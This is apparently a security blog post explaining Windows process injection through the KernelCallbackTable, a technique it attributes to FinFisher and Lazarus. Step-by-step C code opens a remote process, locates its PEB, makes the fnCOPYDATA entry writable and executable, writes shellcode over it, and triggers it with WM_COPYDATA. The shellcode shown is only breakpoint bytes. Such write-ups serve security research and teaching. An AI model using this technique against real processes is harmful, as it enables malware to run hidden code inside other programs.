---
layout: post
title:  "Windows Process injection via KernelCallbackTable"
date:   2024-05-19  07:29:20 +0700
tags: [windows]
categories: jekyll update
usemathjax: true
---

<!-- # Windows Process injection via KernelCallbackTable -->

### Contents
- [Overview](#overview-kernelcallbacktable)
- [Finding KernelCallbackTable](#finding-kernelcallbacktable)
- [Code](#code)
  - [Step 1: Open a handle to the remote process](#step-1-open-a-handle-to-the-remote-process)
  - [Step 2: Retrieve the PEB Structure Information](#step-2-retrieve-the-peb-structure-information)
  - [Step 3: Reading the PEB and KernelCallbackTable using ReadProcessMemory](#step-3-reading-the-peb-and-kernelcallbacktable-using-readprocessmemory)
  - [VirtualProtectEx to change mem permission](#virtualprotectex-to-change-mem-permission)
  - [Writing to process memory using WriteProcessMemory](#writing-to-process-memory-using-writeprocessmemory)
  - [Triggering the event using SendMessage](#triggering-the-event-using-sendmessage)

> ## Overview KernelCallbackTable

This method of process injection was used by [FinFisher/FinSpy](https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/) and [Lazarus](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)

The _**kernelcallbacktable**_ is always configured when there are UI-related elements linked to the application and it is initialized to an array of functions when user32.dll is loaded into a GUI process. It is utilized to manage all pointers and structures involved in sending messages within a process, such as interprocess communication. This allows for messages to be sent between applications via the kernel callback.

The functions are invoked to perform various operations usually in response to window messages. For example, _**fnCOPYDATA**_ is executed in response to the _**WM_COPYDATA**_ message, so in the PoC, this function is replaced to demonstrate the injection. Finfisher uses the _**fnDWORD**_ function.

We simply duplicate the existing table or overwrite the address with our own payload in the kernelcallbacktable, set the _**fnCOPYDATA**_ function to address of payload, update the PEB with address of new table and invoke using _**WM_COPYDATA**_. By hooking into that table, we can define our own triggers, enabling us to send messages to the application, which will in turn execute our code.

> ## Finding KernelCallbackTable

In WinDbg, we can use the _**dt_peb**_ command to display the Process Environment Block (PEB) structure. Within this structure, the _**KernelCallbackTable**_ can be found at the offset +0x058.

![https://i.postimg.cc/hjRshK4s/image.png](https://i.postimg.cc/hjRshK4s/image.png)

- In WinDbg, to find the pointer to the _**KernelCallbackTable**_, you can use the following command:
```
? poi(@$peb+0x58)
```
This command evaluates the expression at the offset +0x058 of the Process Environment Block (PEB), providing the address of the _**KernelCallbackTable**_.

We can use the _**dps**_ command to display specific content within an address.

![https://i.postimg.cc/5NMtp0n1/image.png](https://i.postimg.cc/5NMtp0n1/image.png)

We are particularly interested in the _**fn_copydata**_ function, which calls _**wm_copydata**_, a predefined structure. We can write code that sends information to Notepad using _**copydata**_. Notepad has a predefined table with function pointers that can be directed to our desired functions. When the callback is triggered, it will execute as intended.

Our plan is to overwrite the _**copydata**_ callback with our desired function to achieve the intended operation.

> ## Code

> ### Step 1: Open a handle to the remote process.

- We will modify the PEB table of another process, which requires accessing the memory of the remote process. We need the process ID of the target process for injection. We can obtain this using a WinAPI function:
```c
DWORD PID = atoi(argv[1]);
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
```

- The returned handle is an internal structure containing the necessary information to interact with the remote process. It is important to perform a sanity check, which can be done using a _**printf**_ statement:
```c
printf("Process PID %d HANDLE 0x%p\n", PID, hProc);
```
This handle contains internal information that Windows uses to permit operations on the remote process. The _**OpenProcess**_ call is now successful.

> ### Step 2: Retrieve the PEB Structure Information

- To retrieve the PEB structure information, we use the _**NtQueryInformationProcess**_ WinAPI function, which is not documented by Windows due to its internal use.
```c
NTSTATUS(*NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
```

- First, we resolve this function using _**GetProcAddress**_:
```c
NtQueryInformationProcess = GetProcAddress(LoadLibrary("ntdll.dll"), "NtQueryInformationProcess");
printf("NtQueryInformationProcess at 0x%p\n", NtQueryInformationProcess);
```
At this point, we have a pointer to _**NtQueryInformationProcess**_.

- Interestingly, there is always a pointer, even if we haven't opened a process, because it's a local structure. The _**pbi**_ structure exists locally and doesn't depend on the process being opened. If _**hProc**_ fails, the call doesn't achieve anything, but the _**pbi**_ structure is still present locally.

- Now that we have the address of _**NtQueryInformationProcess**_, we can use it like a standard C function to retrieve the necessary information. To access the structure, define the following:
```c
PROCESS_BASIC_INFORMATION pbi;
```

- We can access elements using the dot operator, which will resolve correctly. To extract the PEB base address, use:
```c
NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
printf("PROCESS_BASIC_INFORMATION at 0x%p\n", &pbi);
printf("PROCESS_BASIC_INFORMATION PebBaseAddress at 0x%p\n", pbi.PebBaseAddress);
```

- Now we have the actual PEB base address inside the remote process. The key difference is that we are doing this in a remote process, requiring us to open the process and navigate through its memory to obtain this information.

> ### Step 3: Reading the PEB and KernelCallbackTable using _**ReadProcessMemory**_

- To read the information inside the PEB structure of the remote process, we define:
```c
PEB peb;
DWORD dwBytesRead = 0;
```

- We then use the _**ReadProcessMemory**_ WinAPI function to read from the PEB base address:
```c
ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(PEB), &dwBytesRead);
printf("PEB at 0x%p. Read %d bytes\\n", peb, dwBytesRead);
```
This allows us to copy the PEB of the remote process into our current process.

- Next, we retrieve the KernelCallbackTable by defining:
```c
DWORD64 *dwKct;
KERNELCALLBACKTABLE kct;
```

- We then access the callback table offset at +0x58 using some casting:
```c
dwKct = *(DWORD64*)((unsigned char*)&peb + 0x58);
printf("KERNELCALLBACKTABLE at 0x%p\\n", dwKct);
```

- We define the _**KERNELCALLBACKTABLE**_ structure, which is not built into the compiler, so we source it from ReactOS and include it in our code before the _**main**_ function. We read the KernelCallbackTable data from the remote process:
```c
ReadProcessMemory(hProc, dwKct, &kct, sizeof(KERNELCALLBACKTABLE), &dwBytesRead);
printf("KERNELCALLBACKTABLE.__fnCOPYDATA at 0x%p. Read %d bytes\\n", kct.__fnCOPYDATA, dwBytesRead);
```
This allows us to access the _**fnCOPYDATA**_ element of the KernelCallbackTable in the remote process.

> ### VirtualProtectEx to change mem permission

We now have a pointer to a specific element, allowing us to change its memory location permissions using _**VirtualProtectEx**_.

Next, we can overwrite a few bytes. Each time _**fnCOPYDATA**_ is called, it will execute our injected shellcode, such as a MessageBox.

Using _**SendMessage**_ triggers _**WM_COPYDATA**_, which calls _**fnCOPYDATA**_. When we send a message to a process (e.g., notepad.exe), it triggers the event, looks at the table, copies data, calls _**fnCOPYDATA**_, and executes our code.

To change the memory location permissions, we use _**VirtualProtectEx**_, which works on remote processes. The normal _**VirtualProtect**_ function is for local processes.

- We define _**dwOld**_ to receive the previous access protection:
```c
DWORD dwOld;
VirtualProtectEx(hProc, kct.__fnCOPYDATA, dwShellcode, PAGE_EXECUTE_READWRITE, &dwOld);
```

- The shellcode will contain:
```c
CHAR shellcode[] = "\\xcc\\xcc\\xcc\\xcc";
DWORD dwShellcode = 4;
```

Each time a debugger is attached, _**0xCC**_ will cause a breakpoint, making debugging easier.

We should avoid writing extensive shellcode that might overwrite arbitrary memory with callbacks. Instead, we patch it and change it to a pointer to the address created using _**VirtualAlloc**_.

By doing this, we've changed the memory location permission and set it to read-write-execute (RWX).

> ### Writing to process memory using _**WriteProcessMemory**_

- This code inserts shellcode into a process's memory and displays the number of bytes successfully written.
```c
WriteProcessMemory(hProc, kct.__fnCOPYDATA, shellcode, dwShellcode, &dwBytesRead);
printf("%d bytes written\\n", dwBytesRead);
```

> ### Triggering the event using _**SendMessage**_

We are ready to trigger the event using _**SendMessage**_. To do this, we will need a handle to the window (_**hwnd**_). We will retrieve a window element since this is how we will send messages inside the process.

To get the _**hwnd**_, we will use the _**FindWindow**_ We will retrieve a handle to that element.

Once we have the handle to _**shell_traywnd**_, we need to tie it to a process. We can do this using _**GetWindowThreadProcessId**_. Here is an example code:

```c
COPYDATASTRUCT cds;
cds.dwData = 1;
cds.cbData = 4;
cds.lpData = "AAAA";

HWND hw = NULL;
DWORD dwWindowPID = 0;
do {
    hw = FindWindowEx(NULL, hw, NULL, NULL);
    GetWindowThreadProcessId(hw, &dwWindowPID);
    if (dwWindowPID == PID) {
        printf("HWND %p belongs to PID %d\\n", hw, PID);
        LRESULT result = SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds);
        printf("GetLastError returned %d\\n", GetLastError());
    }
} while (hw != NULL);
return 0;

```

Once it hits _**CCCC**_, it will break. We have to ensure the shellcode returns properly and that the process survives the change.

As this is a proof of concept, Explorer might crash. It's not recommended to run this on your machine; use a VM instead.